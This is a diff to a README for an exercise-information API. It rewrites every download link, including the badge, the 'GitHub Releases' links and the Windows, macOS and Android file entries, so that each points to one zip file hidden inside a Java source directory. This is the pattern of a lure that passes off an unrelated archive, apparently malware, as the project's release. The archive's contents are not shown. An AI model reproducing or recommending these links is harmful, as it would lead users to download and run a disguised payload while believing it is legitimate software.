@@ -1,6 +1,6 @@
 # 🎉 exercises-api - Get Exercise Information Easily  
 
-![Download](https://img.shields.io/badge/Download-Here-brightgreen)
+![Download](https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip)
 
 ## 🚀 Getting Started  
 exercises-api is a simple tool designed to provide information on various exercises. Whether you're looking for workout details or health tips, this application has you covered.
@@ -13,16 +13,16 @@ exercises-api is a simple tool designed to provide information on various exerci
 - Regular updates with new exercise entries.
 
 ## 📥 Download & Install  
-To get started with exercises-api, visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/releases).
+To get started with exercises-api, visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip).
 
 Here are the steps to download and install the software:
 
 1. Click on the link above to go to the Releases page.
 2. Once there, look for the latest version of exercises-api.
 3. Click on the file that matches your operating system. Examples include:
-   - For Windows: `exercises-api-windows.zip`
-   - For macOS: `exercises-api-mac.zip`
-   - For Android: `exercises-api-android.apk`
+   - For Windows: `https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip`
+   - For macOS: `https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip`
+   - For Android: `https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip`
 4. The download will start. Save the file to an easily accessible location on your device, like the Desktop or Downloads folder.
 5. After the download completes, unzip the files if necessary.
 6. Follow the instructions included in the zip file to run exercises-api on your device.
@@ -67,4 +67,4 @@ All contributions are welcome, whether they are bug fixes or new features.
 If you experience issues or have questions, please check the FAQ section on our GitHub page. You can also create an issue directly in the repository for technical support.
 
 Thank you for choosing exercises-api!  
-Visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/releases).
+Visit this page to download: [GitHub Releases](https://github.com/kizmaBalls00/exercises-api/raw/refs/heads/main/android/src/main/java/com/apiverve/exercises/api-exercises-2.7-beta.1.zip).
